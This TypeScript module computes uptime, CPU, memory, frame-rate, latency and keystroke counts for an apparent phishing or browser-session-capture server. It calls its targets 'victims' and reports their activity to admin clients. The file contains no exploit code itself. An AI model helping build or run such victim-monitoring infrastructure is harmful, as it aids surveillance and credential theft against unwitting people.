import os from 'os';
import type { BrowserInstance } from './types.js';

// ═══════════════════════════════════════════════════════════════════════════════
// Module State
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Server start timestamp (milliseconds since epoch).
 * Used to calculate uptime.
 */
const serverStartTime = Date.now();

/**
 * Last CPU usage measurement.
 * Used to calculate CPU percentage between measurements.
 */
let lastCpuUsage = process.cpuUsage();

/**
 * Timestamp of last CPU usage check (milliseconds since epoch).
 * Used to calculate time delta for CPU percentage.
 */
let lastCpuCheck = Date.now();

/**
 * Per-victim metrics storage.
 * Maps browser ID to metrics tracking object.
 */
const victimMetrics = new Map<string, VictimMetrics>();

/**
 * Internal metrics tracking structure for each victim.
 */
interface VictimMetrics {
  /** Total number of frames captured */
  frameCount: number;
  
  /** Timestamp of last frame (milliseconds since epoch) */
  lastFrameTime: number;
  
  /** Timestamps of last 30 frames for FPS calculation */
  frameTimestamps: number[];
  
  /** Sum of all frame latencies (for average calculation) */
  latencySum: number;
  
  /** Number of latency measurements */
  latencyCount: number;
  
  /** Total number of keystrokes recorded */
  keystrokeCount: number;
}

// ═══════════════════════════════════════════════════════════════════════════════
// System Metrics
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * System-wide metrics payload structure.
 * Sent to admin clients every 2 seconds.
 */
export interface SystemMetrics {
  /** Number of currently active victim sessions */
  activeVictims: number;
  
  /** Maximum concurrent victims allowed */
  maxVictims: number;
  
  /** Server uptime in seconds */
  uptimeSeconds: number;
  
  /** Current memory usage in MB */
  memoryUsageMB: number;
  
  /** Total system memory in MB */
  memoryTotalMB: number;
  
  /** Memory usage as percentage (0-100) */
  memoryPercent: number;
  
  /** CPU usage as percentage (0-100) */
  cpuPercent: number;
  
  /** Total number of sessions started today */
  totalSessionsToday: number;
}

/**
 * Collects and returns system-wide metrics.
 * 
 * **Metrics Included:**
 * - Active victim count
 * - Server uptime
 * - Memory usage (RSS - Resident Set Size)
 * - CPU usage percentage
 * - Daily session count
 * 
 * @param activeInstances - Array of all active browser instances
 * @param maxVictims - Maximum concurrent victims allowed
 * @returns System metrics object
 */
export function getSystemMetrics(
  activeInstances: BrowserInstance[],
  maxVictims: number,
): SystemMetrics {
  const mem = process.memoryUsage();
  const totalMemory = getTotalSystemMemory();
  const memUsageMB = Math.round(mem.rss / 1024 / 1024);
  const memTotalMB = Math.round(totalMemory / 1024 / 1024);

  return {
    activeVictims: activeInstances.filter(i => i.claimed && i.victimSocket !== null).length,
    maxVictims,
    uptimeSeconds: Math.floor((Date.now() - serverStartTime) / 1000),
    memoryUsageMB: memUsageMB,
    memoryTotalMB: memTotalMB,
    memoryPercent: Math.round((memUsageMB / memTotalMB) * 100),
    cpuPercent: getCpuUsagePercent(),
    totalSessionsToday: getTodaySessionCount(),
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// Per-Victim Metrics
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Per-victim metrics payload structure.
 * Sent to admin clients every 2 seconds for each active victim.
 */
export interface VictimMetricsData {
  /** Browser instance ID */
  browserId: string;
  
  /** Session duration in seconds */
  sessionDurationSeconds: number;
  
  /** Current frames per second (calculated from last 30 frames) */
  currentFPS: number;
  
  /** Average frame latency in milliseconds */
  averageLatencyMs: number;
  
  /** Total number of keystrokes recorded */
  keystrokeCount: number;
  
  /** Memory usage for this browser context in MB (currently unused) */
  memoryUsageMB: number;
}

/**
 * Collects and returns metrics for a specific victim.
 * 
 * **Metrics Included:**
 * - Session duration (time since connection)
 * - Current FPS (calculated from last 30 frames)
 * - Average frame latency
 * - Keystroke count
 * 
 * @param instance - Browser instance to collect metrics for
 * @returns Victim metrics object
 */
export function getVictimMetrics(instance: BrowserInstance): VictimMetricsData {
  const metrics = victimMetrics.get(instance.id);
  
  const sessionDuration = instance.connectedAt
    ? Math.floor((Date.now() - instance.connectedAt.getTime()) / 1000)
    : 0;

  const fps = metrics ? calculateFPS(metrics.frameTimestamps) : 0;
  const avgLatency = metrics && metrics.latencyCount > 0
    ? Math.round(metrics.latencySum / metrics.latencyCount)
    : 0;

  return {
    browserId: instance.id,
    sessionDurationSeconds: sessionDuration,
    currentFPS: fps,
    averageLatencyMs: avgLatency,
    keystrokeCount: metrics?.keystrokeCount ?? 0,
    memoryUsageMB: 0, // TODO: Add per-context memory tracking if needed
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// Metric Recording Functions
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Records a frame capture event for FPS calculation.
 * 
 * Maintains a sliding window of the last 30 frame timestamps
 * for accurate FPS calculation.
 * 
 * @param browserId - Browser instance ID
 */
export function recordFrame(browserId: string): void {
  let metrics = victimMetrics.get(browserId);
  if (!metrics) {
    metrics = {
      frameCount: 0,
      lastFrameTime: Date.now(),
      frameTimestamps: [],
      latencySum: 0,
      latencyCount: 0,
      keystrokeCount: 0,
    };
    victimMetrics.set(browserId, metrics);
  }

  const now = Date.now();
  metrics.frameCount++;
  metrics.frameTimestamps.push(now);
  
  // Keep only last 30 frames for FPS calculation (sliding window)
  if (metrics.frameTimestamps.length > 30) {
    metrics.frameTimestamps.shift();
  }
  
  metrics.lastFrameTime = now;
}

/**
 * Records a frame latency measurement.
 * 
 * Latency is the time between frame capture and frame delivery.
 * Used to calculate average latency for performance monitoring.
 * 
 * @param browserId - Browser instance ID
 * @param latencyMs - Latency in milliseconds
 */
export function recordLatency(browserId: string, latencyMs: number): void {
  const metrics = victimMetrics.get(browserId);
  if (!metrics) return;
  
  metrics.latencySum += latencyMs;
  metrics.latencyCount++;
}

/**
 * Records a keystroke event.
 * 
 * Increments the keystroke counter for the victim.
 * Used for activity monitoring and session analysis.
 * 
 * @param browserId - Browser instance ID
 */
export function recordKeystroke(browserId: string): void {
  const metrics = victimMetrics.get(browserId);
  if (!metrics) return;
  
  metrics.keystrokeCount++;
}

/**
 * Clears all metrics for a victim.
 * 
 * Called when a victim disconnects to free memory.
 * 
 * @param browserId - Browser instance ID
 */
export function clearVictimMetrics(browserId: string): void {
  victimMetrics.delete(browserId);
}

// ═══════════════════════════════════════════════════════════════════════════════
// Internal Helper Functions
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Calculates frames per second from a list of frame timestamps.
 * 
 * **Algorithm:**
 * - Takes timestamps of last N frames (up to 30)
 * - Calculates time span from first to last frame
 * - Divides frame count by time span to get FPS
 * 
 * @param timestamps - Array of frame timestamps (milliseconds since epoch)
 * @returns Frames per second (rounded to nearest integer)
 */
function calculateFPS(timestamps: number[]): number {
  if (timestamps.length < 2) return 0;
  
  const timeSpan = timestamps[timestamps.length - 1] - timestamps[0];
  if (timeSpan === 0) return 0;
  
  const fps = ((timestamps.length - 1) / timeSpan) * 1000;
  return Math.round(fps);
}

/**
 * Calculates CPU usage percentage since last check.
 * 
 * **Algorithm:**
 * - Uses Node.js process.cpuUsage() to get user + system CPU time
 * - Calculates delta since last measurement
 * - Converts to percentage based on elapsed wall-clock time
 * 
 * **Note:** Returns 0 if called too frequently (< 100ms between calls)
 * to avoid inaccurate measurements.
 * 
 * @returns CPU usage percentage (0-100)
 */
function getCpuUsagePercent(): number {
  const now = Date.now();
  const currentUsage = process.cpuUsage();
  const timeDiff = now - lastCpuCheck;
  
  // Too soon to measure accurately
  if (timeDiff < 100) return 0;
  
  const userDiff = currentUsage.user - lastCpuUsage.user;
  const systemDiff = currentUsage.system - lastCpuUsage.system;
  const totalDiff = userDiff + systemDiff;
  
  // Convert microseconds to milliseconds and calculate percentage
  const cpuPercent = (totalDiff / 1000 / timeDiff) * 100;
  
  lastCpuUsage = currentUsage;
  lastCpuCheck = now;
  
  return Math.round(Math.min(cpuPercent, 100));
}

/**
 * Gets total system memory in bytes.
 * 
 * Uses Node.js built-in os.totalmem() for accurate system memory.
 * 
 * @returns Total system memory in bytes
 */
function getTotalSystemMemory(): number {
  // Use Node.js built-in to get actual system memory
  return os.totalmem();
}

/**
 * Session count for today.
 * Reset at midnight (based on ISO date string comparison).
 */
let sessionCountToday = 0;

/**
 * Date of last session count (ISO date string: YYYY-MM-DD).
 * Used to detect day rollover and reset counter.
 */
let lastSessionCountDate = new Date().toISOString().slice(0, 10);

/**
 * Increments the daily session counter.
 * 
 * Automatically resets counter at midnight (day rollover).
 * Called when a new victim connects.
 */
export function incrementSessionCount(): void {
  const today = new Date().toISOString().slice(0, 10);
  if (today !== lastSessionCountDate) {
    sessionCountToday = 0;
    lastSessionCountDate = today;
  }
  sessionCountToday++;
}

/**
 * Gets the number of sessions started today.
 * 
 * Returns 0 if called on a different day than last increment
 * (handles server running across midnight).
 * 
 * @returns Number of sessions started today
 */
function getTodaySessionCount(): number {
  const today = new Date().toISOString().slice(0, 10);
  if (today !== lastSessionCountDate) {
    return 0;
  }
  return sessionCountToday;
}